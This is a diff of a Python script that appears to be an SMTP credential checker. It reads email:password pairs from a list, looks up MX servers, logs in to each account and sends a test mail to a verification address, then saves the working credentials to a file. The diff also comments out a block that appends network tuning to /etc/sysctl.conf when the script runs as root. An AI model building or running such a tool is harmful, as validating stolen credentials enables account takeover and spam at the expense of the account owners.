@@ -32,11 +32,11 @@ def tune_network():
 	try:
 		os.system("ulimit -n 15000")
 		os.system("ulimit -n 65535")
-		if os.geteuid() == 0:
-			print('tuning network settings...')
-			os.system("echo 'net.core.rmem_default=65536\nnet.core.wmem_default=65536\nnet.core.rmem_max=8388608\nnet.core.wmem_max=8388608\nnet.ipv4.tcp_max_orphans=4096\nnet.ipv4.tcp_slow_start_after_idle=0\nnet.ipv4.tcp_synack_retries=3\nnet.ipv4.tcp_syn_retries =3\nnet.ipv4.tcp_window_scaling=1\nnet.ipv4.tcp_timestamp=1\nnet.ipv4.tcp_sack=0\nnet.ipv4.tcp_reordering=3\nnet.ipv4.tcp_fastopen=1\ntcp_max_syn_backlog=1500\ntcp_keepalive_probes=5\ntcp_keepalive_time=500\nnet.ipv4.tcp_tw_reuse=1\nnet.ipv4.tcp_tw_recycle=1\nnet.ipv4.ip_local_port_range=32768 65535\ntcp_fin_timeout=60' >> /etc/sysctl.conf")
-		else:
-			print('Better to run this script as root to allow better network performance')
+		# if os.geteuid() == 0:
+		# 	print('tuning network settings...')
+		# 	os.system("echo 'net.core.rmem_default=65536\nnet.core.wmem_default=65536\nnet.core.rmem_max=8388608\nnet.core.wmem_max=8388608\nnet.ipv4.tcp_max_orphans=4096\nnet.ipv4.tcp_slow_start_after_idle=0\nnet.ipv4.tcp_synack_retries=3\nnet.ipv4.tcp_syn_retries =3\nnet.ipv4.tcp_window_scaling=1\nnet.ipv4.tcp_timestamp=1\nnet.ipv4.tcp_sack=0\nnet.ipv4.tcp_reordering=3\nnet.ipv4.tcp_fastopen=1\ntcp_max_syn_backlog=1500\ntcp_keepalive_probes=5\ntcp_keepalive_time=500\nnet.ipv4.tcp_tw_reuse=1\nnet.ipv4.tcp_tw_recycle=1\nnet.ipv4.ip_local_port_range=32768 65535\ntcp_fin_timeout=60' >> /etc/sysctl.conf")
+		# else:
+		# 	print('Better to run this script as root to allow better network performance')
 	except:
 		pass
 
@@ -145,8 +145,8 @@ def worker_item(jobs_que, results):
 					smtp_server, port = get_mx_server(smtp_user.split('@')[1])
 				except Exception as e:
 					continue
-			results.put(f'{c.BOLD}connecting to{c.END} {smtp_server}|{port}|{smtp_user}|{password}')
 			try:
+				results.put(f'{c.BOLD}connecting to{c.END} {smtp_server}|{port}|{smtp_user}|{password}')
 				smtp_connect_and_send(smtp_server, port, smtp_user, password)
 				results.put(f'{c.GREEN}{c.BOLD}{smtp_user}:{password}{c.END} sent to {verify_email}')
 				open(smtp_filename, 'a').write(f"{smtp_server}|{port}|{smtp_user}|{password}\n")
@@ -214,7 +214,7 @@ total_lines = wc_count(list_filename)
 print(f'total lines to procceed: {c.BOLD}{str(total_lines)}{c.END}')
 print(f'email coll: {c.BOLD}{str(email_collumn)}{c.END}, password coll: {c.BOLD}{str(password_collumn)}{c.END}')
 print(f'verification email: {c.BOLD}{verify_email}{c.END}')
-with tqdm.tqdm(total=total_lines,initial=start_from_line) as progress_bar, open(list_filename, 'r', encoding='utf-8') as fp:
+with tqdm.tqdm(total=total_lines,initial=start_from_line) as progress_bar, open(list_filename,'r',encoding='utf-8') as fp:
 	threading.Thread(target=every_second, daemon=True).start()
 	for i in range(int(start_from_line)):
 		line = fp.readline()
